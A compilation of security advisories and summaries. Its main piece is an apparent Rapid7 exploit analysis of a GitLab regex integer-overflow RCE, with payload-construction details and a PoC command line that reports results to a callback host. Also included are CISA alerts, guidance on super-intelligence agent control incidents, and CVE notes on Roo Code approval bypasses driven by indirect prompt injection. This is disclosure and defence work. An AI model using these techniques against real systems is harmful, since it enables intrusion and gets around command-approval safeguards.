summary: Overview On October 12, 2026, GitLab released 19.4.2 , 19.3.5 , and 19.2.8 to fix CVE-2026-97229 , an integer overflow in its CI/CD regular-expression handling. The issue was reported through HackerOne by joaxcar . GitLab assigned it a CVSS score of 10.0 and described possible code execution by an unauthenticated user. The advisory states that CVE-2026-97229 affects GitLab CE and EE from 19.2 before 19.2.8 , 19.3 before 19.3.5 , and 19.4 before 19.4.2 . GitLab says all deployment types are affected unless stated otherwise. GitLab.com was patched before disclosure, and Dedicated customers do not need to act. Rapid7 researchers developed an end-to-end PoC that reliably runs arbitrary commands as GitLab's git operating-system account on the official Linux amd64 gitlab/gitlab-ce:19.4.1-ce.0 image with ASLR enabled. GitLab's release notes do not report exploitation in the wild occurring at the time of disclosure. This analysis covers one end-to-end route. It begins after an attacker has pushed both the malicious CI configuration and a specially named path to a public project; only the final CI lint request is unauthenticated. That prerequisite conflicts with GitLab's PR:N rating, and because the underlying report remains private, we do not yet know how the reported attack avoids it. Technical analysis At a high level, the chain crosses from attacker-controlled repository input into Onigmo pcode and finally native code execution. Figure 1: From repository inputs to command execution. CI rules pass repository paths to Onigmo GitLab supports regular-expression matching over repository paths in rules:exists:regexp and rules:changes:regexp . One way to evaluate such an expression during static configuration processing is to place it on a conditional include: include: - local: /benign.yml rules: - exists: regexp: "ATTACKER_PATTERN" RegexpMatcher expands the expression, compiles it with Ruby's native regular-expression engine, and tests it against paths from the selected Git worktree: # Exists#regexp_match?() def regexp_match?(context) matcher = regexp_matcher(context) matcher.validate_pattern_length! # [0] Source-length check Gitlab::SafeRequestStore.fetch(regexp_comparison_key(context, matcher.expanded_pattern)) do # ... top-level optimisation omitted matcher.match?(worktree_paths(context, false)) # [1] Repository paths end end # RegexpMatcher#match?() def match?(paths) # ... path-count fail-open handling omitted pattern = compile_pattern # [2] Compile regexp deadline = current_monotonic_time + REGEXP_TOTAL_TIMEOUT_SECONDS paths.any? do |path| # ... total-budget check omitted pattern.match?(path) # [3] Native match # ... per-match timeout handling omitted end end By the time execution reaches [0] , GitLab is checking only the length of the expanded source expression. The call at [1] supplies every filename in the selected commit, while compile_pattern at [2] ultimately invokes Regexp.new . Each iteration at [3] therefore crosses from CI configuration into native Onigmo with a repository path as the match subject. Smuggling a large repeat through the checks GitLab places several sensible limits around CI regular expressions. The interesting parts of its wrapper are shown below: REPEAT_BOUND = /(?<!\\)(?:\\\\)*\{\s*(\d+)\s*(?:,\s*(\d+)?\s*)?\}/ # [4] Repeat scanner def self.compile_regexp(pattern, timeout: nil) raise RegexpError, 'uses a subroutine call (\g), which is not allowed' if SUBROUTINE_CALL.match?(pattern) # [5] Subroutine-call check reject_large_repeats!(pattern) # [6] Repeat-bound check alternation_free = pattern.gsub(ESCAPE_OR_ALTERNATION) { |token| token == '|' ? '\\|' : token } probe = begin Regexp.new(alternation_free) rescue RegexpError => e # ... error-message rewriting omitted end check_compiled_size!(probe) # [7] Probe size check check_compiled_size!(Regexp.new(pattern, timeout: timeout)) # [8] Final size check end The source-length check occurs before this function. The subroutine-call check at [5] and the repeat-bound check at [6] defend against structural growth, but the scanner at [4] recognizes only contiguous digits. Compilation then happens twice: [7] checks an alternation-free probe, and [8] checks the requested expression and attaches the 50-millisecond timeout. Either object is rejected if it exceeds one megabyte. The PoC hides its quantifier bound from the scanner at [4] via an inline comment: {5(?#)7805} (?#) is an inline regex comment. Onigmo ignores it and reads the bound as 57,805. GitLab's scanner expects contiguous digits, so it does not see a bound above 1,000. That bypass admits the large repeat, but the checked expression is still only 986 bytes. The six [[:word:]] classes expand when matching begins against a repository path containing valid four-byte UTF-8 characters. Ruby recompiles the same source for UTF-8, each POSIX word class expands into a large Unicode range table, and GitLab never checks the size of this new program. Ruby selects or recompiles the regex before starting its timed matcher: /* re.c: rb_reg_prepare_re() */ regex_t *reg = RREGEXP_PTR(re); if (reg->enc == enc) return reg; // [9] Matching encoding // ... source preprocessing and use-count branch omitted r = onig_new_without_alloc(&tmp_reg, (UChar *)ptr, (UChar *)(ptr + len), reg->options, enc, OnigDefaultSyntax, &einfo); // [10] Onigmo recompile // ... error handling and old-program replacement omitted /* re.c: rb_reg_onig_match() */ reg = rb_reg_prepare_re(re, str); // ... use-count bookkeeping omitted OnigPosition result = match(reg, str, regs, args); // [11] Begin timed match // ... result cleanup omitted At [9] , Ruby returns the existing program only when its encoding matches the subject. Otherwise, [10] recompiles the source for the subject encoding via Onigmo. Only then does [11] begin timed matching, leaving the unsafe compilation outside the timeout. Onigmo compiles the regular expression into bytecode, which its source calls pcode. Its regex VM then runs that pcode against each path, so the UTF-8 recompilation at [10] is where the oversized pcode program is created. The repeated target also carries the bytes that run after the overflow: # poc.py: build() # ... prefix setup omitted target = "(?<=" + "[[:word:]]" * 6 + "".join(character_class(stage) for stage in STAGES) digits = str(REPEAT_COUNT) pattern = f"\\A(?>{prefix}(?:{target}){{{digits[0]}(?#){digits[1:]}}}|)\\b\\B" The six [[:word:]] classes are only the size multiplier. The payload sits in four more character classes generated by character_class(stage) . A class such as [abc] compiles to a bitmap with bits set for a , b , and c . The helper works backwards from each desired pcode sequence and chooses class members whose bitmap reproduces those bytes. This puts attacker-controlled VM instructions at the end of every expanded copy. Crossing INT_MAX Under UTF-8, one copy of the repeated body is 37,151 bytes. The relevant Onigmo compiler code in Ruby 3.3.12 is: /* regcomp.c: compile_quantifier_node() */ /* ... earlier quantifier cases omitted */ else if (!infinite && qn->greedy && (qn->upper == 1 || (tlen + SIZE_OP_PUSH) * qn->upper <= QUANTIFIER_EXPAND_LIMIT_SIZE)) { // [12] Signed size check int n = qn->upper - qn->lower; r = compile_tree_n_times(qn->target, qn->lower, reg); // [13] Expand lower copies if (r) return r; // ... optional copies omitted } /* ... remaining quantifier cases omitted */ With this body size (37,151) and quantifier bound (57,805): 37,151 × 57,805 = 2,147,513,555 = 0x800074d3 That is 29,908 (0x74D4) bytes beyond signed INT_MAX (0x7FFFFFFF). At [12] , the negative result satisfies the compiler's “small enough to expand” test. Onigmo enters the expansion path at [13] and emits all 57,805 copies. The | immediately after {5(?#)7805} makes the repeated body the first alternative and leaves the second alternative empty. Onigmo compiles this | into two pcode branches. An OP_PUSH near the beginning is meant to record the empty alternative as a backtracking target, but does not transfer execution on this path. The first bad transfer is the OP_JUMP emitted after the giant first alternative by the alternation compiler : /* regcomp.c: compile_tree(), NT_ALT */ /* ... calculate alternation length omitted */ pos = reg->used + len; /* goal position */ /* ... emit the fallback and first alternative omitted */ if (IS_NOT_NULL(NCDR(node))) { len = pos - (reg->used + SIZE_OP_JUMP); r = add_opcode_rel_addr(reg, OP_JUMP, len); // [14] Skip empty branch if (r) break; } The jump at [14] should skip the empty alternative and land at the end of the alternation. The compiler calculated pos from the already wrapped length, however. Our build emits the jump at offset 2,147,513,698 with a displacement of -136 , sending execution into the first payload bitmap in the last expanded copy, 140 bytes from the end of the pcode. From character-class bitmap to system() The wrapped branch now leaves normal generated pcode and enters a controlled character-class bitmap. Onigmo consequently runs the bytes encoded by character_class() as VM instructions, starting the sequence shown here. Figure 2: From controlled Onigmo pcode to native command execution. The controlled pcode redirects Onigmo's backtracking stack, which holds saved match state, into the repository path. On a failed match, the VM restores the two values shown in the diagram: the next instruction from the path and FinishCode , a pointer from its bottom stack frame. The first value decides where controlled pcode resumes. The second gives it a known address inside libruby . The path instruction sends control to the final controlled bitmap. That bitmap adjusts the recovered libruby pointer to a short instruction sequence that passes the path command to system() , then writes that address into match_at() 's native return slot. When the matcher finishes, execution returns through the overwritten slot. FinishCode and the call site are in the same libruby mapping, so the distance between them stays constant under ASLR. Exploitation Delivering the branch through CI lint Once the malicious configuration and path are present on a public branch, GitLab's CI lint API supplies an unauthenticated trigger. The GET form accepts an attacker-selected content_ref , loads .gitlab-ci.yml from that commit, and evaluates it: GET /api/v4/projects/attacker%2Fpublic-project/ci/lint?content_ref=payload-ref Host: gitlab.example The route checks whether the requester may read the public repository, resolves the supplied ref, and passes its CI configuration to the static linter: get ':id/ci/lint' do authorize_read_code! # [17] Read authorization not_found! 'Repository' if user_project.empty_repo? unauthorized!("This endpoint requires an API authentication") if current_user && !::Current.token_info # [18] Token check content_ref = params[:content_ref] || params[:sha] || user_project.repository.root_ref_sha # [19] Select commit dry_run_ref = params[:dry_run_ref] || params[:ref] || user_project.default_branch commit = user_project.commit(content_ref) not_found! 'Commit' unless commit.present? content = user_project.repository.blob_data_at(commit.sha, user_project.ci_config_path_or_default) result = Gitlab::Ci::Lint .new(project: user_project, current_user: current_user, sha: commit.sha) .legacy_validate(content, dry_run: params[:dry_run], ref: dry_run_ref) # [20] Run static lint present result, with: Entities::Ci::Lint::Result, current_user: current_user, include_jobs: params[:include_jobs] end Public visibility makes authorize_read_code! at [17] succeed without credentials, while the condition at [18] does not reject an absent current_user . The selected branch becomes the static linter's input through [19] and [20] , without creating a pipeline or contacting a runner. This is why the exploit's trigger can be unauthenticated even though the demonstrated setup requires project write access. Running a command The initial Python PoC clones a public project controlled by the operator, creates a payload branch, starts the callback, and sends the lint request: $ python3 poc.py https://g.example 123 \ --git-url 'https://oauth2:ATTACKER_TOKEN@g.example/attacker/public-poc.git' \ --callback-url cb.ex:8000 \ --cmd 'uname -a && id' [*] deployed attacker ref 69fe2478c446ab17afe4c150; executing: uname -a && id [*] delivery GET https://g.example/api/v4/projects/123/ci/lint?content_ref=69fe2478c446ab17afe4c150 [*] target stopped responding after delivery: HTTP Error 502: Bad Gateway [uname output omitted] uid=998(git) gid=998(git) groups=998(git) HTTP 502 is expected. The command runs synchronously in a Puma worker. After system() returns, the corrupted worker crashes. GitLab Workhorse, the reverse proxy in front of Puma, sees its Rails backend connection close and returns 502. Puma replaces the worker. The callback output, not the HTTP status, is the success signal. The target-specific values in this PoC, such as SYSTEM_STEP_COUNT , the number of UTF-8 backward steps from FinishCode to the libruby system() call site, match official GitLab CE 19.4.1 on Linux amd64. Other vulnerable packages or architectures need adjusted pcode and libruby offsets. A little over 2 GiB is required in the worker, and our complete single-node GitLab target needed about 9 GiB available. Low-memory instances may swap, reject the allocation, or invoke the OOM killer. The fix GitLab's Ruby backport replaces the multiplication at [12] with a division-based test, which cannot overflow, and rejects compiled programs above roughly 512 MiB: /* regcomp.c */ #define IS_EXPAND_LIMIT_OK(tlen, n) \ ((n) <= 0 || (tlen) <= QUANTIFIER_EXPAND_LIMIT_SIZE / (n)) /* ... unrelated compiler declarations omitted */ #define MAX_COMPILED_PROGRAM_SIZE (INT_MAX_LIMIT / 4) On the patched image, the crafted quantifier remains a compact loop and the request returns a normal false match. The repeat-range double-free fixed in the same release affects an error path and is not part of this chain. Detection guidance For the exploitation strategy described in this analysis, correlate: /var/log/gitlab/gitlab-workhorse/current : a several-second GET /api/v4/projects/<project>/ci/lint?content_ref=<ref> , badgateway: failed to receive response: EOF , and HTTP 502. A Puma worker crashes or restarts at the same time; any saved trace contains regexp_matcher.rb . The referenced commit: an (?#) -split repeat, repeated POSIX word classes, and a path containing four-byte UTF-8 characters. A shell child or roughly 2 GiB worker-memory increase strengthens the match. The undisclosed path may differ. Mitigation guidance Self-managed GitLab customers should upgrade to the fixed patch for their release: 19.2.8 , 19.3.5 , or 19.4.2 . As a temporary measure, restrict credential-free access to attacker-writable public projects or block this lint route. Route controls do not repair the vulnerable Ruby compiler. Please read GitLab's critical patch release for the latest guidance.

summary: Some awards you're happy to receive, while others make you stop for a moment. Receiving the 2026 Péter Szőr Award this week at Virus Bulletin in Seville for our research, BPFdoor in Telecom Networks: Sleeper Cells in the Backbone , was of the latter kind. Virus Bulletin created the award to honor Péter's life and work, and it recognizes outstanding technical security research: the rigorous, the deep, and the useful – exactly what he was known for himself. And as far as recognitions in our industry go, it's hard to top. I'm extremely proud. What the Pèter Szőr Award means to us I knew Péter, and early in my career, I learned from him. This was back when malware analysis meant staring at assembly, arguing about what a routine really did, and realizing hours later that your first theory was wrong. One memory came straight back when I heard about the award: going through Stuxnet together. For anyone in research at the time, that was the moment you knew the game had changed. Engineering, tradecraft, espionage and physical-world consequences, all in one package. What stayed with me wasn't how much Péter knew, but rather his curiosity. He wanted to understand things, and then once he did, he wanted everyone else to understand too. Plenty of brilliant people in cybersecurity keep it to themselves, but the ones who leave a legacy make the people around them better. Receiving an award that carries his name felt like one of those full-circle moments. The research behind the award The original research from Rapid7 Intelligence emerged after months of investigating stealthy access inside telecommunications environments. This wasn't malware dropped during a conventional intrusion, but long-term strategic positioning: passive backdoors, kernel-level capabilities and covert access, quietly settled into critical infrastructure and in no hurry whatsoever. Telecom networks carry our communications, our identities and, increasingly, everything governments and businesses run on. So when an adversary sets up camp there, the impact goes well beyond one compromised machine or one unlucky company. Virus Bulletin's community nomination noted that the work paired deep technical investigation with real-world impact, including long hours with agencies and CERTs around the world and tools, scripts, intelligence and detection capabilities for defenders. That's the part I'm happiest about, as this wasn't research for publication alone. Remember that a PDF has never stopped an intrusion. Publishing research is a checkpoint, not the finish line We're still doing the research. Since the original report, Rapid7 Intelligence has analyzed hundreds more samples, found previously undocumented BPFDoor variants, and tracked changes in the operators' tradecraft. Our follow-up work covered new httpShell and icmpShell variants built to make detection even harder. In further publications , we went beyond BPFDoor to additional Linux implants and infrastructure targeting telecom and network-edge environments, including AVERAT and techniques that hide in ordinary-looking traffic like SMTP. That's how this work goes. You find something, you share it, someone sends you another sample, a CERT spots something in their environment, an analyst notices the one odd function nobody looked at twice, and you're back down the rabbit hole. Anyone who thinks an initial report is the finish line has never received "just one more sample" at 4 p.m. on a Friday. And truthfully, I also love that this happens in the open. From the outside, our industry looks like a cage match over attribution, naming conventions and whose acronym is cooler. But when something truly matters, researchers, vendors, CERTs and governments put that aside and share, because protecting people beats winning the naming argument. This award belongs to the team: Rapid7 Intelligence Research like this never belongs to just one or two people. It belongs to the analysts still staring at code after everyone else has gone home, the people who question an assumption because something doesn't add up, the people that keep the show running, and the detection engineers who turn findings into something defenders can use. It also belongs to the people collecting samples, maintaining infrastructure and correlating intelligence, and to the CERTs, agencies and peers who trusted us enough to share what they saw. I'm proud of the Rapid7 Intelligence team, and not because of the trophy. I'm proud of why we got it: we took a hard problem, did the hard work, and then tried to make the result useful to someone else. To the next generation of research Today, the conversation has evolved to include autonomous agents, AI-generated malware and machine-speed attacks. Tomorrow it'll be something new. My motivation stays the same: I want to leave the digital world a little safer for the generations that come after us. Somewhere right now, a young researcher is opening a debugger for the first time and wondering how on earth the thing works. Someone will investigate the Stuxnet of their generation, and someone will eventually sit in the chair I'm in now. Our job isn't just to detect today's attacks. It's to share what we learn, build tools, mentor people and make sure they start a few steps ahead of where we did. Péter did that for our industry, and he did it for me. Thank you to Virus Bulletin and our peers in the security community for this recognition, to everyone who contributed to the research, publicly or behind the scenes, and to Péter, who taught a young malware researcher that taking things apart is only half the job. The other half is making sure somebody else can learn from what you found.

summary: CISA is aware of critical authentication bypass vulnerability CVE-2026-102764 , affecting BeyondTrust Remote Support (formerly Bomgar) versions 26.2.3 and earlier. Patches are available for supported versions (24.3.1 and later); organizations using older versions must upgrade first. Cyber threat actors are actively exploiting the vulnerability to gain initial access, then establishing persistence, escalating privileges, and moving laterally. CISA added CVE-2026-102764 to its Known Exploited Vulnerabilities (KEV) catalog on Oct. 16, 2026. CISA urges organizations with affected self-hosted Remote Support appliances to immediately take the following actions: Apply the BT26-05-RS patch, as outlined in BeyondTrust’s Security Advisory BT26-05 . Organizations on a self-hosted Remote Support version older than 24.3.1 will need to upgrade to a newer version to apply the patch. Organizations using BeyondTrust-hosted (SaaS) Remote Support deployments have already been patched. Review BeyondTrust’s blog ARMORY CASTLE and BT26-05: What Security Teams Need to Know for detailed information on the vulnerability and recommended response and mitigation actions. Limit external access to the Remote Support appliance to the services needed to support users and customers. Restrict access to administrative interfaces to trusted networks. Review BeyondTrust’s B Series Appliance on-premises security for additional guidance on securing network connectivity for self-hosted Remote Support appliances. Organizations with affected self-hosted Remote Support appliances should conduct network and memory forensics to identify evidence of potential compromise. If your organization suspects a compromise, CISA recommends taking the following actions: Isolate any suspected or confirmed compromised appliances. Collect a snapshot of virtual appliances or forensic image for physical appliances to conduct future forensics, immediately forward appliance syslog and session events to the SIEM, and collect any additional logs, such as web application firewall, reverse-proxy, or perimeter firewall logs for the exposure window. Consult BeyondTrust’s Syslog guide for additional information on forwarding appliance logs and session events. Conduct network and forensic investigations for evidence of compromise. Additionally, hunt for indicators of threat actor activity, including unrecognized privileged or administrative sessions, unrecognized script files, unexpected gaps in logs or log forwarding, and unauthorized account, permission, or session-policy changes. Consult CISA’s Binding Operational Directive (BOD) 26-04: Implementation Guidance for Prioritizing Security Updates Based on Risk to assist with prioritizing vulnerability remediation. Rebuild from a known-good state and apply the BT26-05-RS patch. Then rotate every credential the appliance stored or injected, revoke all active support sessions, and review new multifactor authentication registrations on privileged accounts. CISA urges organizations to review the BeyondTrust security advisory and resources noted above and apply necessary updates. CISA also recommends reviewing Mandiant’s blog, ARMORY CASTLE Exploits BeyondTrust , for additional hunt and isolation guidance and detections. summary: CISA has added two new vulnerabilities to its Known Exploited Vulnerabilities (KEV) Catalog , based on evidence of active exploitation. CVE-2025-61624 Fortinet Multiple Products Path Traversal Vulnerability CVE-2026-102764 BeyondTrust Remote Support Authentication Bypass by Spoofing Vulnerability These types of vulnerabilities are a frequent attack vector for malicious cyber actors and pose significant risks to the federal enterprise. Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied. While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities . CISA will continue to add vulnerabilities to the catalog that meet the specified criteria . Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form . Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

summary: The National Institute of Standards and Technology (NIST), National Security Agency’s Super Intelligence Security Center (NSA SISC) and Cybersecurity and Infrastructure Security Agency (CISA) published Key Practices for Incident Readiness and Response in Super Intelligence Training and Evaluation . The product outlines ten voluntary core practices to help organizations that train and evaluate highly capable super intelligence (SI) agents—particularly pre-deployment, cutting edge SI agents with reduced safeguards or other high-risk, non-public systems—prepare for and manage SI control incidents. A SI control incident occurs when one or more SI agents takes uninstructed actions that conflict with or compromise policies, controls, or security measures that scope the task and provide human oversight. This product aligns with cyber incident response best practices, includes additional SI considerations and highlights the importance of testing controls and validating containment before resuming SI agent activities. It addresses: measures for limiting agent access to information, systems, tools, and networks; monitoring for unexpected activity; preserving evidence and shutting down undesired behavior; rebuilding from verified baselines; and reporting incidents and near-misses to relevant government agencies and affected parties. For more information and resources visit CISA’s Super Intelligence page.

summary: CISA and the Federal Bureau of Investigation (FBI) released a Public Service Announcement (PSA) warning election and campaign officials about cyber threats during the 2026 U.S. midterm elections. Malicious cyber actors may use phishing and smishing techniques to steal login credentials and other sensitive information or install malware on targeted devices. Election officials, candidates, and political organizations may be attractive targets because of their access to voter registration data, current government officials, and sensitive campaign information. Cyber actors are increasingly using sophisticated phishing and smishing campaigns that closely resemble legitimate communications. These efforts may include convincing emails, text messages, audio, and video content designed to manipulate recipients into disclosing sensitive information or interacting with malicious links and attachments. CISA and the FBI urge election officials, campaign personnel, and the public to review the PSA, follow recommended cybersecurity practices, and remain vigilant for suspicious emails and mobile messages.

summary: インテル(R)によって管理されているIntel(R) Open Volume Kernel Library（Intel(R) Open VKL）ライブラリのバージョン2.0.2未満には、リング3のユーザーアプリケーション内におけるヒープベースのバッファオーバーフローが存在し、これによりサービス拒否が引き起こされる可能性があります。認証されたユーザー権限を持つシステムソフトウェアの攻撃者が、低複雑度の攻撃手法を組み合わせることでサービス拒否を引き起こす可能性があります。この影響は、特別な内部知識がなくても攻撃要件を満たさない場合にローカルアクセス経由で発生し、ユーザーの操作を必要としません。この潜在的な脆弱性は、脆弱なシステムの機密性（なし）、完全性（低）、可用性（高）に影響を与える可能性があり、結果として後続のシステムの機密性（なし）、完全性（なし）、可用性（なし）にも影響をもたらします。

summary: Backstageは開発者ポータルを構築するためのオープンフレームワークです。バージョン0.29.2以前では、@backstage/plugin-auth-backendの実験的な動的クライアント登録機能およびクライアントIDメタデータドキュメント機能において、auth.experimentalDynamicClientRegistration.allowedRedirectUriPatternsおよびauth.experimentalClientIdMetadataDocumentsのallowedClientIdPatternsとallowedRedirectUriPatternsオプションで、full-string matcher.isMatchのグロブマッチングが使われていました。ホスト名のワイルドカードはURLコンポーネントの境界を超えてマッチできるため、攻撃者が制御するリダイレクトURIが信頼されたホスト名のサフィックスをパスに含む場合、ホワイトリストを通過し、被害者がフローを完了するとOAuth認可コードを受け取ることが可能です。プロトコルが明示されていないパターンは意図しないプロトコルとマッチする可能性があり、埋め込み認証情報を含むリダイレクトURIは、ユーザー情報がマッチングのために削除された後に許容されます。これらの機能は実験的でデフォルトでは無効化されており、有効にしてカスタムのワイルドカードホスト名やプロトコル無しパターンを設定したデプロイだけが影響を受けます。この問題はプリリリース版0.29.2で初めて修正されました。

summary: Palo Alto NetworksのPAN-OSソフトウェアの管理インターフェースにはリモートコード実行（RCE）の脆弱性が存在します。この脆弱性により、ネットワークアクセス権を持つ認証済み攻撃者がファイアウォール上で任意のコードをroot権限で実行できます。この問題によるセキュリティリスクは、管理インターフェースへのアクセスを信頼された内部IPアドレスのみに制限することで最小化可能です。これは当社が推奨するベストプラクティスの展開ガイドライン（https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431）に沿っています。この問題は、PAシリーズおよびVMシリーズのファイアウォール、並びにPanorama（仮想およびMシリーズ）上のPAN-OSソフトウェアに該当します。なお、Cloud NGFWおよびPrisma Accessはこの脆弱性の影響を受けません。

summary: libsoupに脆弱性が発見されました。soup_uri_decode_data_uri()関数は、g_base64_decode_inplace()を呼び出す際に、base64形式のデータURIペイロードを誤ってヌル終端文字列として扱っていました。パーセントデコードされたペイロードに埋め込みのヌルバイトが含まれている場合、デコードされた長さが初期化されず、その値が返されるGBytesのサイズとして使用される可能性があります。これにより、細工されたデータURIを処理すると、境界外読み取りやアプリケーションがクラッシュするおそれがあります。

summary: Roo Code 3.54.0 までのバージョンには、getCommandDecision() にコマンド承認バイパスの脆弱性が存在します。これにより、攻撃者はコマンドの前に裸の ＞& リダイレクトを付けることで、拒否されたシェルコマンドを自動的に承認させることが可能となります。間接的なプロンプトインジェクションを悪用する攻撃者は、許可リストを echo のようなリダイレクト先に一致させることで、開発者のマシン上で拒否されたコマンドを実行させることができます。

summary: Roo Code 3.54.0までには、コマンド承認バイパスの脆弱性が存在しました。parseCommandLine() が ${ command; } の置換をパラメータ展開として扱うため、攻撃者が拒否されたシェルコマンドを実行できてしまいます。間接的なプロンプトインジェクションを利用する攻撃者は、echo のような許可リストに載ったコマンド内に拒否されたコマンドを埋め込み、bash 5.3以降または ksh93 上でユーザーの承認なしにこれらを実行することが可能です。

summary: Roo Code バージョン 3.54.0 までには、parseCommandLine() にコマンド承認バイパスの脆弱性が存在します。この脆弱性は、* や ? のグロブ文字に隣接するコマンド置換を破棄してしまうものです。間接的なプロンプトインジェクションを悪用する攻撃者は、echo *$(...) のようなコマンドを作成し、許可されたプレフィックスにマッチさせることで、自動承認が有効な場合にユーザーの承認なしで禁止されたコマンドを実行させることが可能になります。

summary: これは、Bitbucket Data Center、Confluence Data Center、Jira Service Management Data Center、Jira Software Data Center、Bamboo Data Center、Crowd Data Center、Crucible、および Fisheye に存在する脆弱性です。この任意ファイルアクセスの脆弱性により、認証されていない攻撃者が影響を受けるバージョンのウェブアプリケーションのルートディレクトリ内の特定ファイルにアクセスできるようになります。攻撃の実行には、対象ファイルの正確な名前とパスを事前に知っている必要があり、この脆弱性は攻撃者によるディレクトリ内容の列挙や一覧表示を許可しません。設定によっては機密性の高いファイルが含まれている場合があり、極めて深刻な影響を及ぼす可能性があります。この脆弱性により、認証されていないリモート攻撃者が影響を受けるバージョンのウェブアプリケーションのルートディレクトリ内の特定ファイルにアクセスできる状態となります。以下の影響を受けるバージョンでは、脆弱性の修正が必要です。-- Bitbucket Data Center: バージョン4.6.0以降、修正バージョン9.4.26、10.2.8、10.5.1 -- Confluence Data Center: バージョン5.10.0以降、修正バージョン9.2.26、10.2.19 -- Crowd Data Center: バージョン2.11.0以降、修正バージョン6.3.7、7.0.3、7.1.7、7.2.4 -- Jira Software Data Center: バージョン7.1.0以降、修正バージョン9.12.40、10.3.26、11.3.12 -- Jira Service Management Data Center: バージョン3.1.0以降、修正バージョン5.12.40、10.3.26、11.3.12 -- Bamboo Data Center: バージョン7.0.1以降、修正バージョン10.2.24、12.1.12 -- Crucible: 修正バージョン4.9.15 -- Fisheye: 修正バージョン4.9.15 -- 攻撃の実行には対象ファイルの正確な名前とパスの事前知識が必要であり、この脆弱性によりディレクトリ内容の列挙や一覧表示はできません。

summary: FFmpeg 8.1 より前のバージョンにはメモリ破損の脆弱性があります。RTP エンコード処理において、libavformat/rtpenc_h264_hevc.c の nal_send 関数で、細工された入力ファイルを用いて RTP 経由で H.264/HEVC ストリームを送信する際に、負のサイズパラメータ (size=-3) が memcpy に渡されます。この問題は AddressSanitizer を使用して検出されました。

summary: RabbitMQはメッセージングおよびストリーミングのブローカーです。バージョン4.0.0から4.3.3、4.2.9、4.1.14、および4.0.23までの間において、AMQP 1.0の管理用GET /bindingsエンドポイントは、リソースや管理権限のチェックを行わずに認証済みの任意のAMQPユーザーに対して完全なバインディングトポロジーを公開してしまいます。このAMQP 1.0 HTTP-over-AMQP管理エンドポイントGET /bindings（rabbitamqpmanagementハンドラー）は、呼び出し元の仮想ホスト内の任意のソースエクスチェンジと宛先キューおよびエクスチェンジ間のバインディングを、リソースレベルの権限チェックを行わずに列挙します。同じモジュール内の他の関連操作（checkresourceaccessやbindingchecksを呼び出す）とは異なり、このGETハンドラーは認証済みユーザーの権限を無視し、バインディング一覧を変更せずに返します。その結果、管理・監視・ポリシーメーカー・管理者のタグを持たないユーザーを含め、管理リンクペアを開ける任意の認証済みAMQP 1.0クライアントがアクセス可能な仮想ホストにおける完全なバインディングトポロジー（ソースエクスチェンジ、宛先キューやエクスチェンジ、ルーティングキー、バインディング引数）を列挙できます。これに対応するHTTP管理APIはGET /api/bindingsです。機密性への影響としては、管理権限を持たないAMQP 1.0ユーザーが接続可能な任意の仮想ホストの完全なルーティングトポロジー（すべてのソースエクスチェンジ、宛先キューやエクスチェンジ、ルーティングキー、バインディング引数）を列挙できる状態です。この問題はバージョン4.3.3、4.2.9、4.1.14、および4.0.23で修正されています。

summary: RabbitMQはメッセージングおよびストリーミングブローカーです。バージョン3.13.0から3.13.15まで、および4.0.22、4.1.11、4.2.6、4.3.1において、Atom枯渇の問題が存在します。OAuth2 JWTタグのscope値について、extractscopes/1は.tag:の形式のスコープを解析し、rabbitdatacoercion:toatom()を呼び出してタグアトムに変換します。トークンの署名は最初に検証されるため、攻撃者がスコープを偽造することはできません。しかし、IDプロバイダー（IdP）構成でスコープ内容がユーザーによって影響を受ける場合、新しいタグ値を用いた各ログインごとに情報漏洩が発生します。ユーザーが自分のIdP発行JWTに含まれるスコープを操作可能な環境で、rabbitmq_auth_backend_oauth2が有効なIdPは、署名付きトークン内に攻撃者が操作したスコープ値を許可します。この問題はバージョン3.13.15および4.0.22、4.1.11、4.2.6、4.3.1で修正されています。

summary: vLLMは大規模言語モデルの推論およびサービングエンジンです。バージョン0.20.2rc0から0.26.0までの間、vllm/renderers/embed_utils.py内のsafe_load_prompt_embedsはtorch.sparse.check_sparse_tensor_invariantsを使用していましたが、この関数のプロセス全体での保存、有効化、および復元の状態が、AsyncMultiModalItemTracker.resolve_items、asyncio.gather、およびデフォルトのエグゼキュータを介してPOST /v1/chat/completionsに送信される同時のprompt_embedsパーツによって競合状態を引き起こす可能性がありました。これにより、enable_prompt_embedsが有効な場合にCVE-2025-62164のガードをすり抜けて無効なスパーステンソルがtensor.to_denseに到達することが許されてしまいます。この問題はバージョン0.26.0で修正されています。

summary: FFmpeg 9.0より前のバージョンには、libavformat/mov.cに符号付き整数オーバーフローの脆弱性があります。mov_read_ispe()関数では、細工されたHEIF ispeボックスから取得したuint32_t型の幅と高さの値を、境界チェックなしに符号付きint型のフィールドに格納するため、INT_MAXを超える値が負の値になる可能性があります。read_image_grid()関数では、これらの値を累積することで符号付き整数のオーバーフローが発生し（C17標準の6.5節における未定義動作）、x86環境では小さな正の値にラップアラウンドしてしまい、下流の妥当性チェックを回避してしまいます。

summary: MOOS core-moos 10.4.0 までには、MOOSCommServer::ListenLoop() にサービス拒否の脆弱性が含まれています。この脆弱性は、ワイヤープロトコルのハンドシェイク中に、accept スレッドがタイムアウトなしでブロッキング受信を行うことによって発生します。攻撃者は、MOOSDB ポートに TCP 接続を開き、データを送信しないことで、accept スレッドがソケットリストのロックを保持したまま無期限にブロックされ、以降のすべてのクライアント接続を妨げることが可能です。

